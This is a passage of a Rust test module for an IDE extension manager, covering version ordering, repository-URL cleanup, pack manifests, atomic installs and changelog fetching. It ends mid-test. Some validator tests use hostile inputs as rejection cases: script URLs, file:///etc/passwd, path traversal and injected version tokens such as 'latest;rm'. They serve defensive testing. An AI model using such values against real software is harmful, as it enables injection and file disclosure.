        // Numeric core, field by field (not lexicographic: 2.10.0 > 2.9.0).
        assert_eq!(version_cmp("2.9.0", "2.10.0"), Some(Ordering::Less));
        assert_eq!(version_cmp("1.0.0", "1.0.0"), Some(Ordering::Equal));
        assert_eq!(version_cmp("2.1.0", "2.0.0"), Some(Ordering::Greater));
        // A leading `v` and build metadata are ignored.
        assert_eq!(
            version_cmp("v1.2.3", "1.2.3+build.9"),
            Some(Ordering::Equal)
        );
        // Missing trailing fields are zero: 1.2 == 1.2.0.
        assert_eq!(version_cmp("1.2", "1.2.0"), Some(Ordering::Equal));
        // A pre-release ranks below its normal release, and numeric pre-release
        // identifiers order numerically.
        assert_eq!(version_cmp("1.0.0-beta", "1.0.0"), Some(Ordering::Less));
        assert_eq!(
            version_cmp("1.0.0-alpha.1", "1.0.0-alpha.2"),
            Some(Ordering::Less)
        );
        // Numeric pre-release identifiers larger than `u64::MAX` still order by
        // value, not lexically: `…100000…` (21 digits) > `…99999…` (20 digits)
        // even though the lexical compare of the digit strings inverts that.
        assert_eq!(
            version_cmp("1.0.0-99999999999999999999", "1.0.0-100000000000000000000"),
            Some(Ordering::Less)
        );
        // Leading zeros do not change a numeric identifier's value.
        assert_eq!(version_cmp("1.0.0-007", "1.0.0-7"), Some(Ordering::Equal));
        // A numeric identifier still ranks below an alphanumeric one, and two
        // alphanumeric identifiers order lexically.
        assert_eq!(
            version_cmp("1.0.0-99999999999999999999", "1.0.0-alpha"),
            Some(Ordering::Less)
        );
        assert_eq!(
            version_cmp("1.0.0-alpha", "1.0.0-beta"),
            Some(Ordering::Less)
        );
        // The numeric < alphanumeric rule holds even when the numeric
        // identifier overflows `u64` and the alphanumeric one starts with a
        // digit: `1a` is alphanumeric, so the huge numeric still ranks lower.
        assert_eq!(
            version_cmp("1.0.0-99999999999999999999", "1.0.0-1a"),
            Some(Ordering::Less)
        );
        // A non-numeric core (a dist-tag) is unorderable.
        assert_eq!(version_cmp("latest", "1.0.0"), None);

        // `version_lt` is strict and conservative: unorderable ⇒ not-less, so no
        // spurious update is advertised.
        assert!(version_lt("2.0.0", "2.1.0"));
        assert!(!version_lt("2.1.0", "2.0.0"));
        assert!(!version_lt("1.0.0", "1.0.0"));
        assert!(!version_lt("latest", "1.0.0"));
    }

    #[test]
    fn normalize_repo_url_rewrites_git_forms() {
        let n = |s: &str| normalize_repo_url(s);
        assert_eq!(
            n("git+https://github.com/nanobpm/nano-ide.git").as_deref(),
            Some("https://github.com/nanobpm/nano-ide")
        );
        assert_eq!(
            n("git://github.com/owner/repo.git").as_deref(),
            Some("https://github.com/owner/repo")
        );
        assert_eq!(
            n("ssh://git@github.com/owner/repo.git").as_deref(),
            Some("https://github.com/owner/repo")
        );
        assert_eq!(
            n("git@github.com:owner/repo.git").as_deref(),
            Some("https://github.com/owner/repo")
        );
        // Already-clean https URL passes through unchanged.
        assert_eq!(
            n("https://github.com/owner/repo").as_deref(),
            Some("https://github.com/owner/repo")
        );
        // Empty / whitespace yields None.
        assert_eq!(n("   "), None);
        // Untrusted non-http(s) schemes are rejected (no XSS via href).
        assert_eq!(n("javascript:alert(1)"), None);
        assert_eq!(n("data:text/html,<script>1</script>"), None);
        assert_eq!(n("file:///etc/passwd"), None);
    }

    #[test]
    fn safe_http_url_allows_only_http_schemes() {
        assert_eq!(
            safe_http_url("https://example.com").as_deref(),
            Some("https://example.com")
        );
        assert_eq!(
            safe_http_url("HTTP://Example.com/x").as_deref(),
            Some("HTTP://Example.com/x")
        );
        assert_eq!(safe_http_url("javascript:alert(1)"), None);
        assert_eq!(safe_http_url("ftp://host/f"), None);
        assert_eq!(safe_http_url(""), None);
    }

    #[test]
    fn official_is_the_nanobpm_scope() {
        assert!(is_official("@nanobpm/urban-pr-review"));
        assert!(is_official("@nanobpm/nano-ide-lang-rust"));
        // Community packs (any other name, incl. other scopes) are not official.
        assert!(!is_official("urban-pr-review"));
        assert!(!is_official("@someoneelse/nano-ide-cool-thing"));
        assert!(!is_official("nano-ide-community-pack"));
    }

    #[test]
    fn pack_component_templates_reads_declared_files() {
        let _guard = ENV_LOCK.lock().unwrap();
        let root = std::env::temp_dir().join(format!("nano-ext-comp-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&root);
        let pack = root.join("nanobpm__nano-ide-components-hvac");
        std::fs::create_dir_all(pack.join("components")).unwrap();
        // A manifest declaring component files: one a single template, one an
        // array of templates. A third declared path escapes the pack dir and one
        // more is missing — both must be skipped, not abort the read.
        std::fs::write(
            pack.join(manifest_name()),
            r#"{
              "id": "components-hvac",
              "kind": "app",
              "displayName": "HVAC Components",
              "components": [
                "components/read.json",
                "components/pair.json",
                "../escape.json",
                "components/missing.json"
              ]
            }"#,
        )
        .unwrap();
        std::fs::write(
            pack.join("components/read.json"),
            r#"{ "id": "hvac.read", "name": "Read", "appliesTo": ["bpmn:Task"] }"#,
        )
        .unwrap();
        std::fs::write(
            pack.join("components/pair.json"),
            r#"[
              { "id": "hvac.a", "appliesTo": ["bpmn:Task"] },
              { "id": "hvac.b", "appliesTo": ["bpmn:Task"] },
              { "id": "not-a-template" }
            ]"#,
        )
        .unwrap();
        std::fs::write(
            root.join("escape.json"),
            r#"{"id":"evil","appliesTo":["x"]}"#,
        )
        .unwrap();

        // SAFETY: test-local env set, serialized on ENV_LOCK; no other test in
        // this module depends on the extensions-root value.
        unsafe { std::env::set_var("NANOBPMN_EXTENSIONS_DIR", &root) };
        let comps = pack_component_templates("components-hvac");
        unsafe { std::env::remove_var("NANOBPMN_EXTENSIONS_DIR") };
        let _ = std::fs::remove_dir_all(&root);

        let ids: BTreeSet<_> = comps
            .iter()
            .filter_map(|c| c.get("id").and_then(|x| x.as_str()).map(String::from))
            .collect();
        // The single template + both valid array entries — but not the id-less
        // array entry, the path-escaping file, or the missing file.
        assert_eq!(
            ids,
            ["hvac.a", "hvac.b", "hvac.read"]
                .into_iter()
                .map(String::from)
                .collect()
        );
        // Built-in packs (no on-disk dir) contribute nothing.
        assert!(pack_component_templates("deno").is_empty());
    }

    #[test]
    fn worker_driver_resolves_declared_entry_first_pack_wins() {
        let _guard = ENV_LOCK.lock().unwrap();
        let root = std::env::temp_dir().join(format!("nano-ext-work-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&root);
        // Pack A: a connector declaring a worker with a real entry, plus a
        // second worker whose entry escapes the pack dir (must not resolve).
        let pack_a = root.join("nanobpm__nano-ide-connector-slack");
        std::fs::create_dir_all(&pack_a).unwrap();
        std::fs::write(
            pack_a.join(manifest_name()),
            r#"{
              "id": "connector-slack",
              "kind": "trigger",
              "displayName": "Slack",
              "workers": [
                { "type": "slack:send-message", "entry": "worker.ts", "displayName": "Send message" },
                { "type": "slack:escape", "entry": "../evil.ts" },
                { "type": "slack:declaration-only" }
              ]
            }"#,
        )
        .unwrap();
        std::fs::write(pack_a.join("worker.ts"), "// worker A").unwrap();
        std::fs::write(root.join("evil.ts"), "// evil").unwrap();
        // Pack B: re-declares the same type — first pack wins, so this must not
        // shadow pack A's resolved entry (dir names sort A before B).
        let pack_b = root.join("nanobpm__nano-ide-connector-slack-dupe");
        std::fs::create_dir_all(&pack_b).unwrap();
        std::fs::write(
            pack_b.join(manifest_name()),
            r#"{
              "id": "connector-slack-dupe",
              "kind": "trigger",
              "displayName": "Slack Dupe",
              "workers": [ { "type": "slack:send-message", "entry": "worker.ts" } ]
            }"#,
        )
        .unwrap();
        std::fs::write(pack_b.join("worker.ts"), "// worker B").unwrap();

        // SAFETY: test-local env set, serialized on ENV_LOCK.
        unsafe { std::env::set_var("NANOBPMN_EXTENSIONS_DIR", &root) };
        let resolved = worker_driver("slack:send-message");
        let escape = worker_driver("slack:escape");
        let decl_only = worker_driver("slack:declaration-only");
        let unknown = worker_driver("nope");
        unsafe { std::env::remove_var("NANOBPMN_EXTENSIONS_DIR") };
        let _ = std::fs::remove_dir_all(&root);

        // A declared entry that exists inside the pack resolves, to pack A's dir.
        let resolved = resolved.expect("slack:send-message worker resolves");
        assert_eq!(resolved.entry, "worker.ts");
        assert!(resolved.dir.ends_with("nanobpm__nano-ide-connector-slack"));
        // Path-escaping, declaration-only, and unknown types do not resolve.
        assert!(escape.is_none());
        assert!(decl_only.is_none());
        assert!(unknown.is_none());
    }

    #[test]
    fn find_program_falls_back_to_local_bin() {
        let _guard = ENV_LOCK.lock().unwrap();
        let home = std::env::temp_dir().join(format!("nano-fp-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&home);
        // A tool an installer dropped in ~/.local/bin, absent from PATH — mirrors
        // uv installed by the astral script under a detached server's minimal PATH.
        let local_bin = home.join(".local").join("bin");
        std::fs::create_dir_all(&local_bin).unwrap();
        let tool = format!("nano-fake-uv-{}", std::process::id());
        std::fs::write(local_bin.join(&tool), b"#!/bin/sh\n").unwrap();

        // SAFETY: test-local env, serialized on ENV_LOCK; restored below.
        let saved_home = std::env::var_os("HOME");
        let saved_path = std::env::var_os("PATH");
        unsafe {
            std::env::set_var("HOME", &home);
            // A PATH that does *not* contain the tool.
            std::env::set_var("PATH", home.join("nowhere"));
        }
        let found = find_program(&tool);
        unsafe {
            match saved_home {
                Some(v) => std::env::set_var("HOME", v),
                None => std::env::remove_var("HOME"),
            }
            match saved_path {
                Some(v) => std::env::set_var("PATH", v),
                None => std::env::remove_var("PATH"),
            }
        }
        let _ = std::fs::remove_dir_all(&home);

        assert_eq!(found.as_deref(), Some(local_bin.join(&tool).as_path()));
    }

    /// Regression for the empty Windows extension marketplace: on Windows `npm`
    /// is `npm.cmd`, so `find_program("npm")` must probe PATHEXT extensions, not
    /// just the bare name. Exercised from POSIX via the pure candidate builder.
    #[test]
    fn windows_program_candidates_apply_pathext() {
        // Windows: npm.cmd / deno.exe must be probed, and executable
        // extensions come BEFORE the bare name (npm ships a non-runnable POSIX
        // shim named exactly `npm` next to `npm.cmd`).
        let npm = program_file_candidates("npm", true, Some(".COM;.EXE;.BAT;.CMD".to_string()));
        assert_eq!(
            npm,
            vec!["npm.com", "npm.exe", "npm.bat", "npm.cmd", "npm"]
                .into_iter()
                .map(String::from)
                .collect::<Vec<_>>(),
            "npm.cmd must be a probed candidate, ahead of the bare name"
        );
        assert!(
            npm.iter().position(|c| c == "npm.cmd").unwrap()
                < npm.iter().position(|c| c == "npm").unwrap(),
            "the runnable shim must win over the bare POSIX shim"
        );

        // A name that already carries a PATHEXT extension is probed verbatim.
        assert_eq!(
            program_file_candidates("npm.cmd", true, None),
            vec!["npm.cmd".to_string()]
        );

        // Missing PATHEXT falls back to a sane default that still includes .CMD.
        assert!(program_file_candidates("npm", true, None).contains(&"npm.cmd".to_string()));

        // POSIX is unchanged: bare name only, no extension games.
        assert_eq!(
            program_file_candidates("npm", false, Some(".EXE;.CMD".to_string())),
            vec!["npm".to_string()]
        );
    }

    /// Class-scoped: the same PATHEXT resolution must let `find_program` locate
    /// a `.cmd` shim on PATH under Windows semantics — the exact failure that
    /// hid every extension. Emulated on POSIX by placing a `<tool>.cmd` file on
    /// PATH and asserting the Windows candidate list would select it.
    #[test]
    fn windows_find_program_resolves_cmd_shim() {
        let dir = std::env::temp_dir().join(format!("nano-fp-cmd-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(dir.join("npm.cmd"), b"@echo off\n").unwrap();

        // Under Windows semantics, `npm` resolves to the `.cmd` shim on PATH.
        let cands = program_file_candidates("npm", true, None);
        let hit = cands.iter().find_map(|c| {
            let p = dir.join(c);
            p.is_file().then_some(p)
        });
        let _ = std::fs::remove_dir_all(&dir);
        assert_eq!(
            hit.as_deref().and_then(|p| p.file_name()),
            Some(std::ffi::OsStr::new("npm.cmd"))
        );
    }

    #[test]
    fn manifest_round_trips() {
        let m = &builtin_extensions()[0];
        assert_eq!(m.id, "deno");
        let s = serde_json::to_string(m).unwrap();
        let back: ExtManifest = serde_json::from_str(&s).unwrap();
        assert_eq!(back.id, "deno");
        assert_eq!(back.display_name, "Deno (TypeScript)");
    }

    #[test]
    fn installed_version_reads_package_json() {
        let _guard = ENV_LOCK.lock().unwrap();
        // Point the extensions root at a unique temp dir and drop a pack with a
        // package.json, then confirm installed_version reads its version.
        let root = std::env::temp_dir().join(format!("nano-ext-ver-{}", std::process::id()));
        let pkg = "@nanobpm/nano-ide-lang-rust";
        // SAFETY: test-local env set; other tests in this module don't depend on
        // the extensions-root *value* (only on path suffixes / builtins).
        unsafe { std::env::set_var("NANOBPMN_EXTENSIONS_DIR", &root) };
        let dir = safe_pkg_dir(pkg).unwrap();
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(dir.join("package.json"), r#"{"version":"1.0.0"}"#).unwrap();

        assert_eq!(installed_version(pkg).as_deref(), Some("1.0.0"));
        assert_eq!(installed_version("@nanobpm/not-installed"), None);
        // The update-available rule: installed version differs from latest.
        assert_ne!(installed_version(pkg).as_deref(), Some("1.1.0"));

        let _ = std::fs::remove_dir_all(&root);
        unsafe { std::env::remove_var("NANOBPMN_EXTENSIONS_DIR") };
    }

    /// Regression guard for issue #1108: a re-install whose build step FAILS must
    /// leave the previously-installed pack byte-for-byte intact — never wiped to
    /// an empty dir. The old destructive `remove_dir_all` before the extract
    /// stranded an empty pack on a transient `npm pack`/`tar` failure, which read
    /// back as `installed_version == None` and silently killed the marketplace
    /// "Update" affordance.
    #[test]
    fn install_atomic_failed_build_preserves_prior_install() {
        let root =
            std::env::temp_dir().join(format!("nano-ext-atomic-fail-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&root);
        let dest = root.join("nanobpm__nano-workforce");
        std::fs::create_dir_all(&dest).unwrap();
        std::fs::write(dest.join("package.json"), r#"{"version":"0.178.1"}"#).unwrap();
        std::fs::write(dest.join("nano-ide.ext.json"), r#"{"id":"nano-workforce"}"#).unwrap();

        let res: Result<(), String> = install_atomic(&dest, |staging| {
            // Simulate a partial extract that then fails (registry hiccup): write
            // some bytes into staging, then error out.
            std::fs::write(staging.join("package.json"), r#"{"version":"0.178.4"}"#).unwrap();
            Err("npm pack failed".into())
        });

        assert!(res.is_err(), "a failing build must surface the error");
        // The prior 0.178.1 install is untouched — NOT emptied.
        let kept = std::fs::read_to_string(dest.join("package.json")).unwrap();
        assert!(
            kept.contains("0.178.1"),
            "prior install must be preserved, got: {kept}"
        );
        assert!(
            dest.join("nano-ide.ext.json").is_file(),
            "prior manifest must survive"
        );
        // No scratch dirs leak into the extensions root (they'd be mis-scanned as packs).
        let leftovers: Vec<_> = std::fs::read_dir(&root)
            .unwrap()
            .flatten()
            .map(|e| e.file_name().to_string_lossy().into_owned())
            .filter(|n| n.contains(".staging.") || n.contains(".backup."))
            .collect();
        assert!(
            leftovers.is_empty(),
            "no staging/backup dirs should remain: {leftovers:?}"
        );

        let _ = std::fs::remove_dir_all(&root);
    }

    /// The success path of the atomic swap: a completed build replaces the prior
    /// install wholesale (stale files gone), and no scratch dirs remain.
    #[test]
    fn install_atomic_success_replaces_atomically() {
        let root = std::env::temp_dir().join(format!("nano-ext-atomic-ok-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&root);
        let dest = root.join("nanobpm__nano-workforce");
        std::fs::create_dir_all(&dest).unwrap();
        std::fs::write(dest.join("package.json"), r#"{"version":"0.178.1"}"#).unwrap();
        // A file only the OLD version had — must be gone after a clean swap.
        std::fs::write(dest.join("stale-old-file"), "x").unwrap();

        let out = install_atomic(&dest, |staging| {
            std::fs::write(staging.join("package.json"), r#"{"version":"0.178.4"}"#).unwrap();
            Ok("ok".to_string())
        })
        .expect("successful build commits");
        assert_eq!(out, "ok");

        let now = std::fs::read_to_string(dest.join("package.json")).unwrap();
        assert!(now.contains("0.178.4"), "new version must be in place");
        assert!(
            !dest.join("stale-old-file").exists(),
            "stale files must not survive the swap"
        );
        let leftovers: Vec<_> = std::fs::read_dir(&root)
            .unwrap()
            .flatten()
            .map(|e| e.file_name().to_string_lossy().into_owned())
            .filter(|n| n.contains(".staging.") || n.contains(".backup."))
            .collect();
        assert!(
            leftovers.is_empty(),
            "no staging/backup dirs should remain: {leftovers:?}"
        );

        let _ = std::fs::remove_dir_all(&root);
    }

    /// A first-time install (no prior `dest`) whose build fails must leave NO
    /// directory behind — not an empty one that would read as a broken install.
    #[test]
    fn install_atomic_failed_first_install_leaves_no_dir() {
        let root =
            std::env::temp_dir().join(format!("nano-ext-atomic-first-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&root);
        let dest = root.join("nanobpm__nano-workforce");

        let res: Result<(), String> =
            install_atomic(&dest, |_staging| Err("npm pack failed".into()));
        assert!(res.is_err());
        assert!(
            !dest.exists(),
            "a failed first install must not leave an empty pack dir"
        );

        let _ = std::fs::remove_dir_all(&root);
    }

    /// Defect-class guard (issue #1108 review): an in-flight [`install_atomic`]
    /// staging dir is a dot-prefixed sibling of the real pack dir and carries a
    /// readable `nano-ide.ext.json` the moment the extract lands. Because its
    /// leading `.` sorts first, if the scan enumerated it, it would *shadow* the
    /// real installed pack of the same id mid-install. [`pack_dirs`] must skip
    /// every leading-dot entry so neither staging nor backup scratch dirs are
    /// ever observable as packs.
    #[test]
    fn pack_dirs_ignores_dot_prefixed_scratch_dirs() {
        let _guard = ENV_LOCK.lock().unwrap();
        let root = std::env::temp_dir().join(format!("nano-ext-scratch-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&root);
        unsafe { std::env::set_var("NANOBPMN_EXTENSIONS_DIR", &root) };

        // The real, committed pack.
        let real = root.join("nanobpm__nano-workforce");
        std::fs::create_dir_all(&real).unwrap();
        std::fs::write(
            real.join(manifest_name()),
            r#"{"id":"nano-workforce","kind":"lang"}"#,
        )
        .unwrap();

        // A mid-install staging sibling of the SAME leaf, dot-prefixed, already
        // carrying a manifest — the exact shadowing hazard.
        let staging = root.join(".nanobpm__nano-workforce.staging.123.456");
        std::fs::create_dir_all(&staging).unwrap();
        std::fs::write(
            staging.join(manifest_name()),
            r#"{"id":"nano-workforce","kind":"lang"}"#,
        )
        .unwrap();
        let backup = root.join(".nanobpm__nano-workforce.backup.123.456");
        std::fs::create_dir_all(&backup).unwrap();

        let dirs = pack_dirs();
        assert!(
            dirs.contains(&real),
            "the real committed pack must be scanned: {dirs:?}"
        );
        assert!(
            !dirs.iter().any(|p| p == &staging || p == &backup),
            "dot-prefixed scratch dirs must never be scanned as packs: {dirs:?}"
        );

        let _ = std::fs::remove_dir_all(&root);
        unsafe { std::env::remove_var("NANOBPMN_EXTENSIONS_DIR") };
    }

    #[test]
    fn pack_readme_reads_installed_readme() {
        let _guard = ENV_LOCK.lock().unwrap();
        // An installed pack's bundled README.md is returned verbatim, flagged
        // as installed (so the UI shows it without a network round-trip).
        let root = std::env::temp_dir().join(format!("nano-ext-readme-{}", std::process::id()));
        let pkg = "@nanobpm/nano-ide-trigger-mqtt";
        unsafe { std::env::set_var("NANOBPMN_EXTENSIONS_DIR", &root) };
        let dir = safe_pkg_dir(pkg).unwrap();
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(dir.join("README.md"), "# MQTT trigger\n\nHello.").unwrap();

        let r = pack_readme(pkg).expect("readme present");
        assert!(r.installed);
        assert!(r.readme.contains("# MQTT trigger"));

        // A pack dir with no README yields None from the installed branch (and
        // this pkg name won't resolve on npm in the hermetic test env).
        let bare = "@nanobpm/nano-ide-trigger-bare-xyz";
        std::fs::create_dir_all(safe_pkg_dir(bare).unwrap()).unwrap();

        let _ = std::fs::remove_dir_all(&root);
        unsafe { std::env::remove_var("NANOBPMN_EXTENSIONS_DIR") };
    }

    // A representative semantic-release CHANGELOG: newest-first, with compare
    // URLs in the headings (so the parser must pick the heading's own version,
    // not a compare-range endpoint).
    const SAMPLE_CHANGELOG: &str = "\
# [0.72.0](https://github.com/nanobpm/nano-workforce/compare/v0.71.0...v0.72.0) (2024-06-01)\n\
\n\
### Features\n\
\n\
* add the shiny new thing\n\
\n\
## [0.71.0](https://github.com/nanobpm/nano-workforce/compare/v0.70.2...v0.71.0) (2024-05-01)\n\
\n\
### Bug Fixes\n\
\n\
* fix the older thing\n\
\n\
## [0.70.2](https://github.com/nanobpm/nano-workforce/compare/v0.70.1...v0.70.2) (2024-04-01)\n\
\n\
* baseline release\n";

    #[test]
    fn heading_version_extracts_release_not_compare_range() {
        // The heading's own version is the FIRST semver token, ahead of the
        // `compare/vX...vY` endpoints that follow.
        assert_eq!(
            heading_version("# [0.72.0](https://x/compare/v0.71.0...v0.72.0) (2024-06-01)")
                .as_deref(),
            Some("0.72.0")
        );
        assert_eq!(
            heading_version("## [1.2.3] - 2024-01-01").as_deref(),
            Some("1.2.3")
        );
        assert_eq!(
            heading_version("## [2.0.0-beta.1] notes").as_deref(),
            Some("2.0.0-beta.1")
        );
        // A bare date/year must not masquerade as a release (needs x.y.z).
        assert_eq!(heading_version("## Unreleased 2024"), None);
        assert_eq!(heading_version("## [1.2] partial"), None);
        // Prerelease/build dots must NOT satisfy the x.y.z requirement: a
        // `x.y` core with metadata (e.g. `2.0-beta.1`) is not a full release.
        assert_eq!(heading_version("## [2.0-beta.1] notes"), None);
        assert_eq!(heading_version("## 1.2+build.7"), None);
        // But a genuine x.y.z core with prerelease metadata still parses.
        assert_eq!(
            heading_version("## [1.2.0-rc.1] notes").as_deref(),
            Some("1.2.0-rc.1")
        );
    }

    #[test]
    fn changelog_delta_scopes_to_entries_newer_than_installed() {
        // Installed 0.70.2, latest 0.72.0 → the delta is 0.72.0 + 0.71.0, and
        // must NOT include the installed 0.70.2 section or anything older.
        let delta = changelog_delta(SAMPLE_CHANGELOG, "0.70.2").expect("delta");
        assert!(delta.contains("0.72.0"));
        assert!(delta.contains("add the shiny new thing"));
        assert!(delta.contains("0.71.0"));
        assert!(delta.contains("fix the older thing"));
        assert!(!delta.contains("baseline release"));

        // A leading `v` on the installed version is tolerated.
        assert_eq!(changelog_delta(SAMPLE_CHANGELOG, "v0.70.2"), Some(delta));
    }

    #[test]
    fn changelog_delta_falls_back_when_installed_is_newest_or_missing() {
        // Already on the newest entry → no delta (caller shows the full log).
        assert_eq!(changelog_delta(SAMPLE_CHANGELOG, "0.72.0"), None);
        // Installed version not present in the changelog → None (full fallback).
        assert_eq!(changelog_delta(SAMPLE_CHANGELOG, "0.69.0"), None);
        // No parseable headings at all → None.
        assert_eq!(changelog_delta("just prose, no versions", "1.0.0"), None);
    }

    #[test]
    fn pack_changelog_reads_installed_and_scopes_delta() {
        let _guard = ENV_LOCK.lock().unwrap();
        let root = std::env::temp_dir().join(format!("nano-ext-changelog-{}", std::process::id()));
        let pkg = "@nanobpm/nano-workforce";
        unsafe { std::env::set_var("NANOBPMN_EXTENSIONS_DIR", &root) };
        let dir = safe_pkg_dir(pkg).unwrap();
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(dir.join("CHANGELOG.md"), SAMPLE_CHANGELOG).unwrap();

        // The installed pack ships a changelog → the availability probe sees it.
        assert!(installed_changelog_path(pkg).is_some());

        // Full changelog (no `from`) prefers the installed copy — offline, no
        // network round-trip.
        let full = pack_changelog(pkg, None, None).expect("changelog present");
        assert!(full.installed);
        assert!(!full.delta);
        assert!(full.changelog.contains("baseline release"));

        // Regression: an empty/whitespace `from` (e.g. `?from=`) is treated as
        // absent — it must behave exactly like the full-changelog case above and
        // NOT force the update-case published-tarball fetch (no delta scoping).
        for empty in ["", "   "] {
            let c = pack_changelog(pkg, Some(empty), None).expect("changelog present");
            assert!(
                c.installed,
                "empty `from`={empty:?} must read the installed copy"
            );
            assert!(!c.delta, "empty `from`={empty:?} must not scope a delta");
            assert!(c.changelog.contains("baseline release"));
        }

        // (The update/delta case — `from` set — prefers the *published* tarball
        // and is exercised network-free by `select_changelog_source_*` below.)

        let _ = std::fs::remove_dir_all(&root);
        unsafe { std::env::remove_var("NANOBPMN_EXTENSIONS_DIR") };
    }

    #[test]
    fn select_changelog_source_prefers_published_for_delta() {
        // Regression: an installed pack's CHANGELOG.md only carries headings up
        // to the *installed* version, so the update/delta case must NOT read it
        // first — doing so makes `changelog_delta` return `None` and wedges the
        // "What's changed" affordance to the old, full changelog. When a delta
        // is wanted we prefer the published tarball, marking the result as not
        // installed.
        let src = select_changelog_source(
            true,
            || Some("installed (old)".to_string()),
            || Some("published (latest)".to_string()),
        );
        assert_eq!(src, Some(("published (latest)".to_string(), false)));

        // Offline (published fetch fails) falls back to the installed copy so we
        // still surface *something*.
        let fallback =
            select_changelog_source(true, || Some("installed (old)".to_string()), || None);
        assert_eq!(fallback, Some(("installed (old)".to_string(), true)));

        // Nothing anywhere → nothing to show.
        assert_eq!(select_changelog_source(true, || None, || None), None);
    }

    #[test]
    fn select_changelog_source_prefers_installed_for_full_view() {
        // No delta wanted (full changelog view): prefer the installed copy —
        // offline, fast, matches what's running.
        let src = select_changelog_source(
            false,
            || Some("installed".to_string()),
            || Some("published".to_string()),
        );
        assert_eq!(src, Some(("installed".to_string(), true)));

        // Not installed → fall back to the published tarball.
        let published = select_changelog_source(false, || None, || Some("published".to_string()));
        assert_eq!(published, Some(("published".to_string(), false)));
    }

    #[test]
    fn fetch_published_changelog_rejects_non_registry_specs() {
        // Regression (security): the changelog fetch builds an `npm pack` spec
        // from the untrusted `pkg`/`version` query params. `npm pack` accepts
        // far more than a registry name, so any non-registry specifier — path
        // traversal, `file:`, a URL, or a version that smuggles a second spec —
        // must be rejected *before* it can reach `npm pack` (which would run no
        // network here because validation bails first, returning `None`).
        for bad in [
            "../evil",
            "..",
            "file:/etc/passwd",
            "https://example.com/x.tgz",
            "a b",
            "@scope/../x",
            "pkg@1.0.0",         // an embedded specifier must not slip through the name
            "/etc",              // absolute local path (no `..`) must not pack a local dir
            "/home/foo/console", // absolute local path with a nested dir
            "some/local/path",   // relative local path (no `..`, no leading `/`)
            "@scope/name/extra", // scoped form with an extra `/` (two slashes)
            "",
            "   ",
        ] {
            assert!(
                fetch_published_changelog(bad, None).is_none(),
                "must reject non-registry pkg spec {bad:?}"
            );
        }

        // A malicious version token would otherwise smuggle a second spec into
        // `<pkg>@<v>`; it is validated (and rejected) before any `npm pack` runs.
        for bad_ver in ["1 ../evil", "latest;rm", "../../x", "file:/x", "1.0/../y"] {
            assert!(
                fetch_published_changelog("@nanobpm/nano-ide-lang-rust", Some(bad_ver)).is_none(),
                "must reject non-registry version {bad_ver:?}"
            );
        }

        // The name validator and the version validator agree with the install
        // path's `safe_pkg_dir` gate (single source of truth for the alphabet).
        assert!(!is_valid_pkg_name("../evil"));
        assert!(!is_valid_pkg_name("/etc")); // absolute local path, no `..`
        assert!(!is_valid_pkg_name("some/local/path")); // relative local path
        assert!(!is_valid_pkg_name("@scope/name/extra")); // extra `/`
        // Dot-/underscore-prefixed segments must be rejected: `.` alone would
        // otherwise make `safe_pkg_dir` resolve to the extensions root itself,
        // and `.hidden` / `_hidden` map to dotfiles under it.
        assert!(!is_valid_pkg_name(".")); // maps to extensions root via safe_pkg_dir
        assert!(safe_pkg_dir(".").is_none());
        assert!(!is_valid_pkg_name(".hidden")); // leading-dot segment
        assert!(!is_valid_pkg_name("_hidden")); // leading-underscore segment
        assert!(!is_valid_pkg_name("@.scope/name")); // leading-dot scope
        assert!(!is_valid_pkg_name("@scope/.name")); // leading-dot name
        assert!(is_valid_pkg_name("@nanobpm/nano-ide-lang-rust"));
        assert!(is_valid_pkg_name("nano-ide-ext-foo")); // plain unscoped name
        assert!(is_valid_pkg_version("1.2.3-beta.1+build"));
        assert!(!is_valid_pkg_version("1 2"));
    }

    #[test]
    fn tar_read_member_caps_oversized_members() {
        // Regression (resource exhaustion): `tar_read_member` reads members out
        // of untrusted registry tarballs, so it must not buffer an arbitrarily
        // large member into memory. A member at/under the cap reads fine; one
        // past the cap is rejected (`None`) instead of ballooning memory.
        if find_program("tar").is_none() {
            return; // no tar on this host — the fn degrades to None anyway
        }
        let dir = secure_temp_dir("nano-tar-member-test").unwrap();
        let pkg = dir.join("package");
        std::fs::create_dir(&pkg).unwrap();
        std::fs::write(pkg.join("CHANGELOG.md"), b"# Changelog\n\nsmall\n").unwrap();
        // One byte over the cap must be rejected.
        let big = vec![b'a'; (MAX_TAR_MEMBER_BYTES + 1) as usize];
        std::fs::write(pkg.join("BIG.md"), &big).unwrap();

        let tar = find_program("tar").unwrap();
        let ok = std::process::Command::new(&tar)
            .args(["czf", "t.tgz", "package"])
            .current_dir(&dir)
            .status()
            .unwrap()
            .success();
        assert!(ok, "failed to build test tarball");

        let small = tar_read_member(&dir, "t.tgz", "package/CHANGELOG.md");
        assert_eq!(small.as_deref(), Some("# Changelog\n\nsmall\n"));
        assert!(
            tar_read_member(&dir, "t.tgz", "package/BIG.md").is_none(),
            "a member past MAX_TAR_MEMBER_BYTES must be rejected, not buffered"
        );
        assert!(
            tar_read_member(&dir, "t.tgz", "package/ABSENT.md").is_none(),
            "an absent member must return None"
        );

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn changelog_available_false_without_bundled_changelog() {
        let _guard = ENV_LOCK.lock().unwrap();
        let root =
            std::env::temp_dir().join(format!("nano-ext-nochangelog-{}", std::process::id()));
        let pkg = "@nanobpm/nano-ide-trigger-mqtt";
        unsafe { std::env::set_var("NANOBPMN_EXTENSIONS_DIR", &root) };
        std::fs::create_dir_all(safe_pkg_dir(pkg).unwrap()).unwrap();

        // Installed pack with no CHANGELOG.md → no availability, no installed
        // changelog path.
        assert!(installed_changelog_path(pkg).is_none());

        let _ = std::fs::remove_dir_all(&root);
        unsafe { std::env::remove_var("NANOBPMN_EXTENSIONS_DIR") };
    }

    #[test]
    fn remove_resolves_manifest_id_when_npm_name_missing() {
        let _guard = ENV_LOCK.lock().unwrap();
        // Console UI has only the manifest id (e.g. "throughput-jvm") from the
